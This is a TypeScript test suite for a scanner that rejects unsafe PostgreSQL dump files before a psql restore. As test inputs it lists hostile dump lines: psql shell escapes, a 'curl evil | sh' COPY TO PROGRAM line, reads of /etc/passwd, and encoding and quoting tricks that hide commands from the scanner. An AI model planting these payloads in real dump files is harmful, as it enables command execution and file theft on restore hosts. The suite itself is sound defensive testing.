import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  assertSafeDumpFile,
  assertSafeDumpText,
  scanDump,
  UnsafeDumpError,
} from "../src/safe-dump";
import { psqlArgs } from "../src/restore";

const ok = (sql: string) => expect(assertSafeDumpText(sql)).resolves.toBeUndefined();
const bad = (sql: string) =>
  expect(assertSafeDumpText(sql)).rejects.toBeInstanceOf(UnsafeDumpError);

const REAL_DUMP = [
  "--",
  "-- PostgreSQL database dump",
  "--",
  "",
  "\\restrict AbC123xyz",
  "",
  "SET statement_timeout = 0;",
  "SET client_encoding = 'UTF8';",
  "SET standard_conforming_strings = on;",
  "SELECT pg_catalog.set_config('search_path', '', false);",
  "CREATE TABLE public.t (",
  "    id uuid NOT NULL,",
  "    name text DEFAULT 'a\\b'::text CHECK (name ~ '^\\d+$')",
  ");",
  "CREATE FUNCTION public.f() RETURNS text LANGUAGE sql AS $$ select E'\\n\\! not a command' $$;",
  "COMMENT ON TABLE public.t IS 'it''s -- not a comment \\! either';",
  "COPY public.t (id, name) FROM stdin;",
  "1\tx\\\\y",
  "\\N\tz",
  "\\.",
  "SELECT pg_catalog.setval('public.s', 1, true);",
  "\\unrestrict AbC123xyz",
  "",
].join("\n");

describe("DumpScanner: accepts what pg_dump writes", () => {
  it("a real-shaped dump, with LF and with CRLF", async () => {
    await ok(REAL_DUMP);
    await ok(REAL_DUMP.replace(/\n/g, "\r\n"));
  });
  it("backslashes inside strings, dollar quotes and comments", async () => {
    await ok("-- \\! id\nselect 1; /* \\! id */\n");
    await ok("select 'it''s \\ ok';\n");
    await ok("select B'0101', X'1F', b'01';\nselect '0'::\"bit\";\n");
    await ok(
      "CREATE FUNCTION f() RETURNS text AS $$ select E'it\\'s \\! x' $$ LANGUAGE sql;\n", // E'' inside a dollar body
    );
    await ok('create table "std\\in" (a int);\n');
    await ok("select 1 /* a /* \\! */ \\! */;\n");
    await ok("select 'a'\n, 'b';\n");
  });
  it("COPY data with \\N, tabs and backslashes; multi-line dollar-quoted bodies", async () => {
    await ok("COPY public.t (a, b) FROM stdin;\n1\t\\N\n\\\\\t\\t\\n\n\\.\nselect 1;\n");
    await ok(
      "CREATE FUNCTION f() RETURNS text AS $body$\nselect '\\! id';\n\\! inside body\n$body$ LANGUAGE sql;\n",
    );
    await ok("create table t (\n\ta int,\n\tcopy text\n);\n"); // a column named copy
  });
  it("a file read in tiny chunks gives the same verdict", async () => {
    const chunks = (s: string) =>
      (async function* () {
        for (const c of s) yield c;
      })();
    await expect(scanDump(chunks(REAL_DUMP))).resolves.toBeUndefined();
    await expect(scanDump(chunks(REAL_DUMP + "\\! id\n"))).rejects.toBeInstanceOf(UnsafeDumpError);
  });
});

describe("DumpScanner: refuses psql meta-commands", () => {
  it("at the start of a line, mid-line, and after a COPY block", async () => {
    await bad("select 1;\n\\! touch /tmp/pwned\n");
    await bad("select 1 \\! id;\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\.\n\\! id\n");
    await bad("\\copy t from '/etc/passwd'\n");
    await bad("select 1;\n\\gset\n");
  });
  it("the other meta-commands, doubled backslashes, ';' glued to the command, CRLF", async () => {
    await bad("\\! id\n");
    await bad("select 1;\n\\i /etc/passwd\n");
    await bad("select 1;\n\\o /tmp/out\n");
    await bad("\\copy t to program 'id'\n");
    await bad("\\copy (select 1) to program 'curl evil | sh'\n");
    await bad("\\c otherdb\n");
    await bad("\\connect otherdb\n");
    await bad("\\set ON_ERROR_STOP off\n");
    await bad("\\\\! id\n");
    await bad("select 1;\\! id\n");
    await bad("select 1;\\\\! id\n");
    await bad("select 1;\r\n\\! id\r\n");
    await bad("select 1;\r\n\\copy t from program 'id'\r\n");
    await bad("select 1;\n  \\! id\n"); // indented
    await bad("select 1;\n\t\\! id\n");
  });
  it("server-side COPY to a program or a file", async () => {
    await bad("COPY t FROM PROGRAM 'id';\n");
    await bad("COPY t TO PROGRAM 'id';\n");
    await bad("COPY t FROM '/etc/passwd';\n");
    await bad("COPY t TO '/tmp/x';\n");
    await bad("copy (select 1) to program 'id';\n");
    await bad("select 1; COPY t FROM PROGRAM 'id';\n");
    await bad("COPY t\n  FROM PROGRAM 'id';\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\.\nCOPY t TO '/tmp/x';\n");
  });
  it("lookalikes of the allowed pg_dump lines", async () => {
    await bad("\\restrict abc \\! id\n");
    await bad("select 1\n\\restrict abc\n;\n");
    await bad("\\unrestrict abc;\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\. \n\\! id\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\.x\n");
  });
  it("a standard string closed by a backslash does not hide the next command", async () => {
    await bad("select '\\'; \\! id --';\n");
  });
});

const COPY_TRAP = "COPY public.t (a) FROM stdin;\n\\! id\n\\.\n";

describe("DumpScanner: statement boundaries as psql sees them", () => {
  it("a plain BEGIN in CREATE FUNCTION/PROCEDURE keeps psql inside the statement", async () => {
    await bad(
      `CREATE FUNCTION f() RETURNS int LANGUAGE sql\nBEGIN\n SELECT 1;\n${COPY_TRAP}END;\n`,
    );
    await bad(`CREATE OR REPLACE PROCEDURE p() LANGUAGE sql BEGIN SELECT 1;\n${COPY_TRAP}END;\n`);
    await bad(`create function f() returns int language sql begin\nselect 1;\n${COPY_TRAP}end;\n`);
  });
  it("padding before BEGIN ATOMIC does not hide it", async () => {
    await bad(
      `CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN${" ".repeat(200)}ATOMIC SELECT 1;\n${COPY_TRAP}END;\n`,
    );
    await bad(
      `CREATE FUNCTION f() RETURNS int LANGUAGE sql ${"-- pad\n".repeat(20)}BEGIN ATOMIC\nSELECT 1;\n${COPY_TRAP}END;\n`,
    );
  });
  it("accepts BEGIN where psql does not track it (dollar bodies, comments, strings)", async () => {
    await ok("CREATE FUNCTION f() RETURNS void LANGUAGE plpgsql AS $$\nBEGIN\n  NULL;\nEND\n$$;\n");
    await ok("-- begin\nselect 1; /* begin */\nselect 'begin';\n");
  });
  it("several statements on one line are refused", async () => {
    await bad("select 1; select 2;\n");
    await bad("select 1; 'x';\n");
    await bad("select 1;;\n");
    await ok("select 1; -- trailing comment\nselect 2; /* c */\n");
  });
  it("a `$` that psql may read differently from the scanner", async () => {
    await bad("select 1$$;\nCOPY public.t (a) FROM stdin;\n\\! id\n\\.\n$$ ;\n");
    await bad("select abc$tag$;\n");
    await ok("select $1, $2;\n");
  });
});

describe("DumpScanner: settings that change how psql reads the file", () => {
  it("SET NAMES, RESET and every SET that pg_dump does not write", async () => {
    await bad("SET NAMES 'SJIS';\n");
    await bad("set names 'sjis';\n");
    await bad("SET\nNAMES 'SJIS';\n");
    await bad("set client_encoding to 'sjis';\n");
    await bad("/*\n*/ SET NAMES 'SJIS';\n");
    await bad("select 1;\nSET NAMES 'SJIS';\n");
    await bad("RESET client_encoding;\n");
    await bad("RESET ALL;\n");
    await bad("SET search_path = evil;\n");
    await bad("SET LOCAL x = 1;\n");
    await bad("SET SESSION AUTHORIZATION postgres;\n");
    await bad("SET statement_timeout = 0; SET NAMES 'SJIS';\n");
    await bad("ALTER DATABASE d SET client_encoding = 'SJIS';\n");
    await bad("ALTER ROLE r SET search_path = x;\n");
    await bad("ALTER\nROLE r SET x = 1;\n");
    await bad("ALTER SYSTEM SET x = 1;\n");
    await bad("select set_config('client_encoding', 'SJIS', false);\n");
    await bad("select set_config\n('client_encoding', 'SJIS', false);\n");
  });
  it("every SET line pg_dump writes, and ALTER ... SET forms it writes", async () => {
    await ok(
      [
        "SET statement_timeout = 0;",
        "SET lock_timeout = 0;",
        "SET idle_in_transaction_session_timeout = 0;",
        "SET transaction_timeout = 0;",
        "SET client_encoding = 'UTF8';",
        "SET standard_conforming_strings = on;",
        "SELECT pg_catalog.set_config('search_path', '', false);",
        "SET check_function_bodies = false;",
        "SET xmloption = content;",
        "SET client_min_messages = warning;",
        "SET row_security = off;",
        "SET default_tablespace = '';",
        "SET default_table_access_method = heap;",
        "",
      ].join("\r\n"),
    );
    await ok("ALTER TABLE ONLY public.t ALTER COLUMN a SET DEFAULT 1;\n");
    await ok("ALTER TABLE public.t SET (fillfactor=70);\nALTER TABLE public.t SET SCHEMA other;\n");
    await ok("ALTER TABLE ONLY public.t\n    ALTER COLUMN a SET NOT NULL;\n");
    await ok("ALTER SEQUENCE public.s SET LOGGED;\nALTER TABLE public.t SET WITHOUT CLUSTER;\n");
    await ok(
      "CREATE FUNCTION f() RETURNS int\n    LANGUAGE sql\n    SET search_path TO 'public'\n    AS $$ select 1 $$;\n",
    );
    await ok("UPDATE t\nSET a = 1;\n");
    await ok('CREATE TABLE t (\n    names text,\n    "client" int\n);\n');
  });
});

describe("DumpScanner: string prefixes", () => {
  it("refuses E'', U&'', U&\"\" and any quote glued to an identifier", async () => {
    await bad("select E'it\\'s';\n");
    await bad("select e'x';\n");
    await bad("select E'\\'; \\! id --';\n");
    await bad("select (E'x');\n");
    await bad("select U&'x';\n");
    await bad('select U&"x";\n');
    await bad("select N'x';\n");
    await bad("select abc'x';\n");
    await bad("select aB'x';\n");
  });
});

describe("DumpScanner: COPY header is matched on the raw line", () => {
  it("accepts quoted mixed-case table and column names", async () => {
    await ok('COPY public."MixedCase" ("Id", "Na me") FROM stdin;\n1\tx\n\\.\nselect 1;\n');
  });
  it("refuses anything but plain identifiers, commas, parentheses and spaces", async () => {
    await bad("COPY public.t (a) FROM stdin WITH (DELIMITER '|');\n1\n\\.\n");
    await bad("COPY public.t (a) FROM stdin; \n\\! id\n\\.\n");
    await bad("COPY public.t ('x') FROM stdin;\n\\! id\n\\.\n");
    await bad('COPY public.t ("a) FROM stdin;\n\\! id\n\\.\n');
    await bad("COPY public.t (a FROM stdin;\n\\! id\n\\.\n");
    await bad("COPY public.t /* c */ (a) FROM stdin;\n\\! id\n\\.\n");
    await bad("COPY public.t (a) FROM stdin; -- c\n\\! id\n\\.\n");
    await bad("COPY public.$x (a) FROM stdin;\n\\! id\n\\.\n");
  });
});

describe("DumpScanner: cost", () => {
  it("scans a 5 MB single line, read in 1 KB chunks, in a bounded time", async () => {
    const line = `select ${"'a', $1, ".repeat(600_000)}1;\n`;
    const t0 = performance.now();
    await ok(line);
    const dir = mkdtempSync(join(tmpdir(), "forgecy-dump-"));
    try {
      const file = join(dir, "db.sql");
      writeFileSync(file, line);
      await assertSafeDumpFile(file, { chunkSize: 1024 });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
    expect(line.length).toBeGreaterThan(5_000_000);
    expect(performance.now() - t0).toBeLessThan(30_000);
  }, 120_000);
});

describe("DumpScanner: refuses constructs that could desync it from psql", () => {
  it("COPY that is not a one-line statement start", async () => {
    await bad("COPY public.t (a)\nFROM stdin;\n\\! id\n");
    await bad("CREATE TABLE t (\nCOPY public.t (a) FROM stdin;\n\\! id\n");
    await bad("select 1; COPY public.t (a) FROM stdin;\n\\! id\n");
    await bad("select 'x\nCOPY public.t (a) FROM stdin;\n';\n\\! id\n"); // not at a statement start
  });
  it("BEGIN ATOMIC bodies", async () => {
    await bad(
      "CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN ATOMIC SELECT 1; COPY t FROM stdin; END;\n\\! id\n",
    );
    await bad("CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN\nATOMIC SELECT 1; END;\n");
  });
  it("string continuation across lines, NUL bytes, and settings that change the lexer", async () => {
    await bad("select 'a'\n'b';\n");
    await bad("select 1;\0\\! id\n");
    await bad("SET standard_conforming_strings = off;\n");
    await bad("select set_config('client_encoding', 'SJIS', false);\n");
    await bad("SET client_encoding = 'SJIS';\n");
    await ok("SET client_encoding = 'UTF8';\nSET standard_conforming_strings = on;\n");
  });
  it("a file that ends inside a string, a comment, or COPY data", async () => {
    await bad("select 'abc\n");
    await bad("select 1 /* open\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n");
  });
});

describe("assertSafeDumpFile", () => {
  it("reads the file and reports the line", async () => {
    const dir = mkdtempSync(join(tmpdir(), "forgecy-dump-"));
    try {
      const file = join(dir, "db.sql");
      writeFileSync(file, "select 1;\nselect 2;\n\\! id\n");
      await expect(assertSafeDumpFile(file, { chunkSize: 5 })).rejects.toMatchObject({ line: 3 });
      writeFileSync(file, REAL_DUMP);
      await expect(assertSafeDumpFile(file)).resolves.toBeUndefined();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("psqlArgs", () => {
  it("runs as one transaction that stops at the first error, without ~/.psqlrc", () => {
    const args = psqlArgs("/tmp/db.sql", "postgres://u:p@h/db");
    expect(args).toEqual(
      expect.arrayContaining([
        "-X",
        "--single-transaction",
        "-v",
        "ON_ERROR_STOP=1",
        "-f",
        "/tmp/db.sql",
      ]),
    );
    expect(args.at(-1)).toBe("postgres://u:p@h/db");
  });
});
